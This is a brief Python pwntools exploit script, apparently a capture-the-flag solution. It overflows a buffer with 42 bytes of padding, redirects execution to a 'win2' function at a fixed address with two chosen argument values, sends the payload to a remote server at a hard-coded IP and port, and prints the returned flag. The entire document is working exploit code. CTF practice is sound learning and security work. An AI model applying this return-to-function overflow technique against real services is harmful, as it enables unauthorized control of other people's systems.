from pwn import *

win2 = 0x8048567

payload = ""
payload += "A"*42
payload += p32(win2)
payload += "AAAA"
payload += p32(0x12345678)
payload += p32(0x87654321)

p = remote("3.92.136.78",5000)

p.recvuntil("name:")
p.sendline(payload)
p.recvuntil("day...\n")
flag = p.recvline()
print "flag: ",flag
